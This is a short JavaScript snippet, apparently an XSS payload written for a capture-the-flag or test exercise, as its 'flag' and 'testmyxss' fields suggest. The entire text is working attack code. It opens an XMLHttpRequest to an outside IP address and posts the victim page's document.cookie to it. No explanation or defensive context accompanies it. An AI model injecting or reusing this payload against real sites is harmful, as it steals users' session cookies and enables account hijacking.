let xhr = new XMLHttpRequest();
//配置请求方式和请求地址
xhr.open("post","http://39.101.137.200:7745/send");
xhr.send("header=flag&listener=testmyxss&content="+document.cookie)
